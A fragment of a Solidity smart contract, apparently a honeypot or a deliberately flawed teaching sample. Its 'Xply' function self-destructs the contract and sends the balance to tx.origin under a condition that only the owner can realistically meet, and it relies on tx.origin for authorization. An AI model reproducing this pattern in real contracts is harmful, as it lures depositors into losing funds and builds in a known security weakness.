function Xply() public payable {
        if (msg.value >= address(this).balance || tx.origin == Owner) {  // fault line
            selfdestruct(tx.origin);
        }
    }